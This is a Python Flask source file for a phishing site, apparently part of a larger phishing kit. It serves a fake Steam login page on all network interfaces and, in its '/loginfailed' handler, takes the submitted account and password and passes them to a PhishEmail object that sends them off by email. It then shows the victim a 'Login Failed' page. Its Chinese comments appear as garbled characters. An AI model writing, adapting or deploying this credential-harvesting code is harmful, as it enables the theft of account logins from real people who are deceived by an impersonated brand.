# -*- coding: gbk -*-
from typing import Optional
from flask import *
import logging
from phish_email import PhishEmail

#����������վ
class PhishWebsite():
    __website = Flask(__name__, template_folder='Templates', static_url_path='', static_folder='Templates') #HTML�ļ�����Templates�ļ���
    __log = logging.getLogger('werkzeug')
    __phish_email : Optional[PhishEmail] = None
    __is_english = False
    
    @classmethod
    def run(cls):
        '''
        ����������վ��IPΪ�������Ӿ�������������IP���˿ں�5000
        '''
        cls.__log.setLevel(logging.ERROR)   #ֻ��ʾ������־��������ʾ������־
        cls.__website.run(host='0.0.0.0', port=5000)

    @classmethod
    def set_phish_email(cls, phish_email : Optional[PhishEmail], is_english : bool = False):
        '''
        ���õ����ʼ���ʵ������Ҫͨ�����ʵ�������������䷢�͵���ɹ�ʱ�Ļظ���

        ����
        phish_email (PhishEmail): �����ʼ���ʵ��
        '''
        cls.__phish_email = phish_email
        cls.__is_english = is_english

    @__website.route('/')
    def home():
        '''
        ��ַ��http://����IP:5000
        '''
        return '''
        <html>
        <head>
            <title>Simple Phish Websit</title>
            <style>
                .center {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-size: 2em;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="center">Simple Phish Websit</div>
        </body>
        </html>
        '''

    @__website.route('/login')
    def login():
        '''
        α��ĵ�¼���档
        ��ַ��http://����IP:5000/login
        '''
        if (PhishWebsite.__is_english): return render_template('Disguised Steam Login (English).html')
        else: return render_template('Disguised Steam Login.html')

    @__website.route('/loginfailed', methods=['POST'])
    def submit():
        '''
        ��¼ʧ�ܽ��棬���µ�¼����ض���ת���˴���
        ��ַ��http://����IP:5000/loginfailed
        '''
        account = request.form.get('account')
        password = request.form.get('password')
        if PhishWebsite.__phish_email: PhishWebsite.__phish_email.send_reply(account, password)
        return '''
        <html>
        <head>
            <title>Login Failed</title>
            <style>
                .center {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-size: 2em;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="center">Login Failed</div>
        </body>
        </html>
        '''